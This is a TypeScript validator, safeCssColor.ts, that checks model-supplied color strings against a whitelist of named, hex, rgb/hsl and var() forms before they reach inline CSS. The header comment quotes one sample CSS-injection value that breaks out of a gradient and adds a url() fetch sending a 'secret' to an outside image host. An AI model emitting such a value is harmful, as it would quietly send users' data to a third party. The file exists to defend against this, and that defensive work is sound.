// safeCssColor.ts — vet a model-supplied color string before it's interpolated into an inline
// `style` value (a `background`, a `linear-gradient(...)`, a swatch fill).
//
// Several library blocks let the model pick free-form colors — a moodboard tile's `from`/`to`
// gradient stops, a media card cover, a legend swatch. Those strings land in a template like
// `background: linear-gradient(135deg, ${from}, ${to})`. Tag-neutralization upstream strips
// `<`/`>` but NOT the characters that matter here: a value such as
//   red), url("https://image.pollinations.ai/prompt/" + secret
// closes the gradient and smuggles in a CSS `url()` fetch toward any host the CSP img-src
// allow-list permits, so that fetch can carry data out. The fix is to accept only
// strings that are unmistakably a plain CSS color and reject anything with the punctuation a CSS
// injection needs. This is the color analogue of safeImageUrl for URLs.

// Named colors we accept. The full CSS named-color set is large; this covers the palette the model
// realistically emits, and anything outside it simply falls back — a design token, not a failure.
const NAMED_COLORS: ReadonlySet<string> = new Set([
  'transparent',
  'currentcolor',
  'black',
  'white',
  'gray',
  'grey',
  'silver',
  'red',
  'crimson',
  'maroon',
  'orange',
  'coral',
  'gold',
  'yellow',
  'olive',
  'lime',
  'green',
  'teal',
  'cyan',
  'aqua',
  'turquoise',
  'skyblue',
  'blue',
  'navy',
  'indigo',
  'purple',
  'violet',
  'magenta',
  'fuchsia',
  'pink',
  'brown',
  'tan',
  'beige',
  'ivory',
  'lavender',
  'salmon',
  'khaki',
  'plum',
  'orchid',
  'slateblue',
  'slategray',
  'slategrey',
  'steelblue',
  'seagreen',
  'forestgreen',
  'tomato',
  'chocolate',
  'goldenrod',
]);

// #rgb / #rgba / #rrggbb / #rrggbbaa.
const HEX = /^#(?:[0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})$/i;
// rgb()/rgba()/hsl()/hsla() with only numbers, %, /, commas, dots, spaces inside — no nested
// functions, no url(), no strings. The outer function name is fixed; the body is punctuation-safe.
const FUNC = /^(?:rgb|rgba|hsl|hsla)\(\s*[0-9.,%/\sdeg]+\)$/i;
// A design-system token reference: var(--name) or var(--name, fallback-token). The fallback is
// itself restricted to token-safe characters so `var(--x, red); background: url(...)` can't ride in.
const VAR = /^var\(\s*--[a-z0-9-]+\s*(?:,\s*[a-z0-9%.,\s#()-]+)?\)$/i;

/**
 * Return the color unchanged if it is unmistakably a safe CSS color literal (hex, rgb/hsl
 * function, named color, or a `var(--token)` reference); otherwise the provided `fallback`
 * (a design token by default). Never lets model punctuation — `)`, `;`, `url(`, quotes — reach an
 * inline style, so a color prop can't smuggle a CSS `url()` fetch or extra declaration.
 */
export function safeCssColor(raw: string | undefined, fallback = 'var(--presence)'): string {
  if (!raw) return fallback;
  const v = raw.trim();
  if (!v || v.length > 64) return fallback;
  if (NAMED_COLORS.has(v.toLowerCase())) return v;
  if (HEX.test(v)) return v;
  if (VAR.test(v)) return v;
  if (FUNC.test(v)) return v;
  return fallback;
}
